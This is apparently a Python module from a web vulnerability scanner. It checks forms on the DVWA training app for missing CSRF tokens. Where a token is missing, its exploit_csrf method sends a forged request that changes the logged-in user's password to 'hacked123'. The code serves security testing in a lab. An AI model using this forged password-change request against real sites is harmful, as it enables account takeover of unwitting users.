import requests
from colorama import Fore, init
from bs4 import BeautifulSoup
import re

init(autoreset=True)

class CSRFScanner:
    """
    Detects CSRF vulnerabilities by checking whether state-changing
    forms include a CSRF token. If no token exists, we prove real
    impact by forging a password-change request on behalf of the
    currently logged-in user — without their interaction.

    A CSRF token is a secret random value the server embeds in
    forms and validates on submission. Without it, any site can
    trick a victim's browser into silently submitting forms to
    the vulnerable site using the victim's existing session.
    """

    def __init__(self, session, base_url="http://127.0.0.1"):
        self.session = session
        self.base_url = base_url.rstrip("/")
        self.findings = []

    # ─────────────────────────────────────────────
    # CHECK — does this form have a CSRF token?
    # ─────────────────────────────────────────────
    def check_form_for_token(self, url, form):
        inputs = form["inputs"]
        method = form["method"]

        # Token-like field names to look for
        token_field_names = ["token", "csrf", "user_token", "_token",
                             "nonce", "authenticity_token", "__requestverificationtoken"]

        for inp in inputs:
            name = inp["name"].lower()
            if any(t in name for t in token_field_names):
                print(f"{Fore.GREEN}[+] CSRF token found: '{inp['name']}' in {url}")
                return True

        # No token found on a form that changes state
        print(f"{Fore.YELLOW}[!] No CSRF token on {url} [{method.upper()}] — potentially vulnerable")
        return False

    # ─────────────────────────────────────────────
    # EXPLOITATION — forge a real password-change request
    # ─────────────────────────────────────────────
    def exploit_csrf(self, target_url):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   CSRF EXPLOITATION -> {target_url}")
        print(f"{Fore.CYAN}{'='*55}\n")

        # DVWA's CSRF page is a password-change form at Low security
        # It accepts a new password with no token validation — meaning
        # anyone can submit this form on behalf of any logged-in user
        print(f"{Fore.BLUE}[*] Forging password-change request as the logged-in user...")
        print(f"{Fore.BLUE}[*] This simulates an attacker page silently submitting")
        print(f"{Fore.BLUE}    the victim's form without their knowledge\n")

        forged_data = {
            "password_new":     "hacked123",
            "password_conf":    "hacked123",
            "Change":           "Change"
            # Note: no user_token field — this is the vulnerability
        }

        try:
            resp = self.session.get(
                target_url,
                params=forged_data,
                timeout=10
            )
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Request failed: {e}")
            return None

        # Check if DVWA accepted the forged request
        if "Password Changed" in resp.text:
            print(f"{Fore.RED}[!] CSRF EXPLOIT SUCCESSFUL")
            print(f"{Fore.RED}    Password changed to 'hacked123' without any user interaction")
            print(f"{Fore.RED}    The victim's session was used to submit the forged request")
            return {
                "forged_url": resp.url,
                "result": "Password Changed",
                "impact": "Attacker changed victim password without interaction"
            }
        else:
            # Check for partial success indicators
            if "password" in resp.text.lower():
                print(f"{Fore.YELLOW}[?] Request accepted but could not confirm password change")
                print(f"{Fore.YELLOW}    Response snippet: {resp.text[500:800]}")
            else:
                print(f"{Fore.YELLOW}[?] Server may have rejected the forged request")
            return None

    # ─────────────────────────────────────────────
    # SCAN ALL DISCOVERED FORMS
    # ─────────────────────────────────────────────
    def scan_all(self, discovered_forms):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   CSRF VULNERABILITY SCAN")
        print(f"{Fore.CYAN}{'='*55}\n")

        # State-changing methods and URLs worth checking
        # GET forms can be CSRF-vulnerable too if they change state
        state_changing_keywords = [
            "csrf", "change", "update", "delete",
            "password", "profile", "account", "settings"
        ]

        for url, forms in discovered_forms.items():
            for form in forms:
                method = form["method"]
                action = form["action"]

                # Only check forms that might change state
                url_lower = url.lower() + action.lower()
                is_state_changing = (
                    method == "post" or
                    any(kw in url_lower for kw in state_changing_keywords)
                )

                if not is_state_changing:
                    continue

                has_token = self.check_form_for_token(url, form)

                if not has_token:
                    exploit_result = None

                    # If this looks like the DVWA CSRF page, run the PoC
                    if "csrf" in url.lower():
                        exploit_result = self.exploit_csrf(
                            f"{self.base_url}/vulnerabilities/csrf/"
                        )

                    self.findings.append({
                        "type":           "CSRF",
                        "severity":       "HIGH",
                        "url":            url,
                        "method":         method,
                        "form_action":    action,
                        "exploitation":   exploit_result
                    })

        print(f"\n{Fore.CYAN}[*] CSRF scan complete: {len(self.findings)} finding(s)")
        return self.findings
